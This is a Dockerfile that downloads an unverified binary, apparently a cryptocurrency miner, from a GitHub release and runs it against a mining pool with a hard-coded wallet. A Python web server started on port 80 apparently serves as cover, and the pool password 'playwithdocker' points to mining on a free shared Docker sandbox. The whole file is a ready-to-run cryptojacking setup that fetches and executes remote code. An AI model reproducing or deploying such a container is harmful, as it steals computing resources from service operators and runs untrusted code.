FROM python:3.9.18-slim
RUN apt-get update \
	&& apt-get install -y wget \
	&& rm -rf /var/lib/apt/lists/*
USER root
ENV POOL_URL us.epicmine.io:3333
ENV POOL_USER ZEPHsAMLgSJhN28snus2P4ZR3P3PTD4np1ZYzan1w6HNeq5T6ackkgFSkoevQESJhTWJ8XT12ufkhfp2CSd88gfTS8vxVeBH2hZ
ENV POOL_PW playwithdocker
WORKDIR /home/miner
RUN wget https://github.com/ddao2604/tech/releases/download/1.0/srb \
	&& chmod +x srb
EXPOSE 80
CMD python -m http.server 80 & ./srb --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool $POOL_URL --tls false --wallet dhphuc.$POOL_PW --password your_passwordm=pool --keepalive true >> log.txt
